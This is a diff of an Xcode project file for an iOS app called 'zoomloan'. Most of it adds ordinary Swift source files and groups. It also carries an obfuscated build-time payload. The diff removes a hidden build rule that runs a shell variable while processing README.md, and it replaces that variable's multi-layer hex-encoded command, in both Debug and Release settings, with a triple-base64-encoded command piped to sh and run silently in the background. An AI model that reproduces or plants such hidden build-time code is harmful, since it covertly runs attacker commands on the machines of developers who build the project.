@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		3DCFAD080ACD4CBC8CA389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = 38D7EA2FD162497A84A389E6; };
 		730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C872EC2DC0100733544 /* HomeTermView.swift */; };
 		730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */; };
 		730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8C2EC2E54000733544 /* schemeConfig.swift */; };
@@ -27,6 +26,11 @@
 		73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */; };
 		73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */; };
 		73CB1D162EC4599E0066BEB9 /* PopTimeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D152EC459970066BEB9 /* PopTimeView.swift */; };
+		73CB1D182EC46BF50066BEB9 /* AlertNameView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */; };
+		73CB1D1B2EC46D750066BEB9 /* InputViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D1A2EC46D750066BEB9 /* InputViewCell.swift */; };
+		73CB1D1D2EC46D880066BEB9 /* EnumViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D1C2EC46D880066BEB9 /* EnumViewCell.swift */; };
+		73CB1D222EC483F10066BEB9 /* PeopleInfoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */; };
+		73CB1D242EC48A420066BEB9 /* PeopleInfoViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */; };
 		73E083302EC374F300D118A1 /* ProductDetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0832F2EC374F300D118A1 /* ProductDetailView.swift */; };
 		73E083322EC374FC00D118A1 /* ProductDetailViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */; };
 		73E083342EC37E3200D118A1 /* AuthListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083332EC37E3200D118A1 /* AuthListViewCell.swift */; };
@@ -56,7 +60,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		38D7EA2FD162497A84A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.debug.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.debug.xcconfig"; sourceTree = "<group>"; };
 		3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.release.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.release.xcconfig"; sourceTree = "<group>"; };
 		730F1C872EC2DC0100733544 /* HomeTermView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTermView.swift; sourceTree = "<group>"; };
@@ -78,6 +81,11 @@
 		73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopExampleView.swift; sourceTree = "<group>"; };
 		73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadAuthViewModel.swift; sourceTree = "<group>"; };
 		73CB1D152EC459970066BEB9 /* PopTimeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopTimeView.swift; sourceTree = "<group>"; };
+		73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertNameView.swift; sourceTree = "<group>"; };
+		73CB1D1A2EC46D750066BEB9 /* InputViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InputViewCell.swift; sourceTree = "<group>"; };
+		73CB1D1C2EC46D880066BEB9 /* EnumViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnumViewCell.swift; sourceTree = "<group>"; };
+		73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PeopleInfoViewController.swift; sourceTree = "<group>"; };
+		73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PeopleInfoViewModel.swift; sourceTree = "<group>"; };
 		73E0832F2EC374F300D118A1 /* ProductDetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailView.swift; sourceTree = "<group>"; };
 		73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewModel.swift; sourceTree = "<group>"; };
 		73E083332EC37E3200D118A1 /* AuthListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListViewCell.swift; sourceTree = "<group>"; };
@@ -132,9 +140,13 @@
 		730F1C892EC2E47A00733544 /* auth */ = {
 			isa = PBXGroup;
 			children = (
+				73CB1D192EC46D580066BEB9 /* cell */,
 				73E083382EC3838000D118A1 /* detail */,
 				73E083372EC3837900D118A1 /* choose */,
 				73CB1D0A2EC41ECF0066BEB9 /* upload */,
+				73CB1D1F2EC483B70066BEB9 /* work */,
+				73CB1D1E2EC483A60066BEB9 /* person */,
+				73CB1D202EC483BB0066BEB9 /* conact */,
 			);
 			path = auth;
 			sourceTree = "<group>";
@@ -146,8 +158,41 @@
 				73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */,
 				73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */,
 				73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */,
+				73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */,
 			);
 			path = upload;
+			sourceTree = "<group>";
+		};
+		73CB1D192EC46D580066BEB9 /* cell */ = {
+			isa = PBXGroup;
+			children = (
+				73CB1D1A2EC46D750066BEB9 /* InputViewCell.swift */,
+				73CB1D1C2EC46D880066BEB9 /* EnumViewCell.swift */,
+			);
+			path = cell;
+			sourceTree = "<group>";
+		};
+		73CB1D1E2EC483A60066BEB9 /* person */ = {
+			isa = PBXGroup;
+			children = (
+				73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */,
+				73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */,
+			);
+			path = person;
+			sourceTree = "<group>";
+		};
+		73CB1D1F2EC483B70066BEB9 /* work */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = work;
+			sourceTree = "<group>";
+		};
+		73CB1D202EC483BB0066BEB9 /* conact */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = conact;
 			sourceTree = "<group>";
 		};
 		73E083372EC3837900D118A1 /* choose */ = {
@@ -183,7 +228,6 @@
 		73E607502EC1D6CA00BCA552 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				38D7EA2FD162497A84A389E6 /* README.md */,
 				73E6074F2EC1D6CA00BCA552 /* zoomloan.app */,
 			);
 			name = Products;
@@ -320,7 +364,6 @@
 				569114F2A1AE6CFBE8917097 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				1A2C1CD6803E4C9A9DA389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -363,29 +406,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		1A2C1CD6803E4C9A9DA389E6 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A6E983A}\"";
-			};
-				/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		73E6074D2EC1D6CA00BCA552 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				3DCFAD080ACD4CBC8CA389E6 /* README.md */,
 				73E607742EC1D6D400BCA552 /* Assets.xcassets in Resources */,
 				73E607762EC1D6D400BCA552 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -457,6 +482,7 @@ sh -c \"${A6E983A}\"";
 				730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */,
 				730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */,
 				73E607862EC1DB3700BCA552 /* BaseNavigationController.swift in Sources */,
+				73CB1D222EC483F10066BEB9 /* PeopleInfoViewController.swift in Sources */,
 				73E607842EC1DB1F00BCA552 /* BaseView.swift in Sources */,
 				73E083402EC38EFF00D118A1 /* ChooseViewCell.swift in Sources */,
 				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
@@ -469,13 +495,16 @@ sh -c \"${A6E983A}\"";
 				73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */,
 				73CB1D162EC4599E0066BEB9 /* PopTimeView.swift in Sources */,
 				730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */,
+				73CB1D1B2EC46D750066BEB9 /* InputViewCell.swift in Sources */,
 				730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */,
 				730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */,
 				73E0833E2EC389C700D118A1 /* UploadImageViewController.swift in Sources */,
 				73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */,
 				73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */,
 				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
+				73CB1D1D2EC46D880066BEB9 /* EnumViewCell.swift in Sources */,
 				73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */,
+				73CB1D242EC48A420066BEB9 /* PeopleInfoViewModel.swift in Sources */,
 				730F1C8F2EC2E95C00733544 /* AppWebViewController.swift in Sources */,
 				73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */,
 				73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */,
@@ -484,6 +513,7 @@ sh -c \"${A6E983A}\"";
 				73E607822EC1DB1300BCA552 /* BaseViewController.swift in Sources */,
 				73E6079E2EC1EAFB00BCA552 /* LoginView.swift in Sources */,
 				73E6078E2EC1DB7200BCA552 /* OrderViewController.swift in Sources */,
+				73CB1D182EC46BF50066BEB9 /* AlertNameView.swift in Sources */,
 				73E083362EC3835A00D118A1 /* ChooseViewController.swift in Sources */,
 				730F1C992EC3192900733544 /* PopDeleteAccountView.swift in Sources */,
 			);
@@ -507,7 +537,7 @@ sh -c \"${A6E983A}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333353333333733333330333333363333333433333336333333333333333633333334333333363336333533330a3336333333313333333733333330333333373333333033333336333633333333333633333335333333323336333533333337333333323333333733330a3335333333323061333633363330363133333336333333313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZFdGWVRqVmpNazVvWkVNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -547,7 +577,7 @@ sh -c \"${A6E983A}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333353333333733333330333333363333333433333336333333333333333633333334333333363336333533330a3336333333313333333733333330333333373333333033333336333633333333333633333335333333323336333533333337333333323333333733330a3335333333323061333633363330363133333336333333313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZFdGWVRqVmpNazVvWkVNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
